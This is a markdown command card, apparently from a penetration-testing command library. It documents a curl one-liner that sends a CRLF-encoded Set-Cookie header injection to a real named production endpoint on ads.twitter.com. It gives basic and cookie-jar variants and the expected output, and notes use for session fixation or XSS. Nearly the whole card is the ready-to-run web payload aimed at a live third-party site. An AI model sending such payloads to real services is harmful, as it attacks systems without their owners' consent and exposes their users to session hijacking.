---
data: >-
  curl -i
  'https://ads.twitter.com/subscriptions/mobile/landing?t=%0d%0aSet-Cookie:%20csrf_id=injection%3b'
tags:
  - cookie-injection
  - crlf-injection
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: a8fbacb0-45ea-4364-ada7-97b62bb5e4fd
created_at: '2025-12-11T06:10:15.995Z'
updated_at: '2025-12-11T06:10:15.995Z'
verified: false
validated: true
submitted: true
---
# curl-set-cookie-injection

## Command

```bash
curl -i 'https://ads.twitter.com/subscriptions/mobile/landing?t=%0d%0aSet-Cookie:%20csrf_id=injection%3b'
```

## Description

This command injects a Set-Cookie header via CRLF to set an arbitrary cookie. Useful for demonstrating session fixation or XSS potential.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include response headers | Yes |
| URL | Endpoint with Set-Cookie injection | Yes |

## Examples

### Basic Usage

```bash
curl -i 'https://ads.twitter.com/subscriptions/mobile/landing?t=%0d%0aSet-Cookie:%20csrf_id=injection%3b'
```

### Advanced Usage

```bash
curl -i --cookie-jar cookies.txt 'https://ads.twitter.com/subscriptions/mobile/landing?t=%0d%0aSet-Cookie:%20csrf_id=injection%3b'
```

## Expected Output

Response with Set-Cookie header setting 'csrf_id=injection' if successful.

## Related

- [[commands/curl-header-injection-test]]
- [[procedures/Demonstrate-Set-Cookie-Injection]]
